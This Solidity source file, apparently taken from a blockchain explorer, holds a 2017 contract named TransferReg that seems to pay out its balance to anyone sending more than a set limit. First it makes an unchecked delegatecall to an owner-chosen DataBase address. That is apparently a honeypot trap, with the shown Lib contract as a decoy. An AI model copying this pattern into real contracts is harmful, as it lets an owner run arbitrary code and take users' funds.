
//Address: 0x62d5c4a317b93085697cfb1c775be4398df0678c
//Contract name: TransferReg
//Balance: 0 Ether
//Verification Date: 12/25/2017
//Transacion Count: 8

// CODE STARTS HERE

pragma solidity ^0.4.18;


contract TransferReg
{
    address public Owner = msg.sender;
    address public DataBase;
    uint256 public Limit;
    
    function Set(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner);
        Limit = limit;
        DataBase = dataBase;
    }
    
    function()payable{}
    
    function transfer(address adr)
    payable
    {
        if(msg.value>Limit)
        {        
            DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
            adr.transfer(this.balance);
        }
    }
    
}

contract Lib
{
    address owner = msg.sender;
    
    bytes lastUknownMessage;
    
    mapping (address => uint256) Db;

    function() public payable 
    {
        lastUknownMessage = msg.data;
    }
    
    function AddToDB(address adr)
    public
    payable
    {
        Db[adr]++;
    }
    
    function GetAddrCallQty(address adr)
    public 
    returns(uint)
    {
        require(owner==msg.sender);
        return Db[adr];
    }
    
    function GetLastMsg()
    public 
    returns(bytes)
    {
        require(owner==msg.sender);
        return lastUknownMessage;
    }
    
    
}
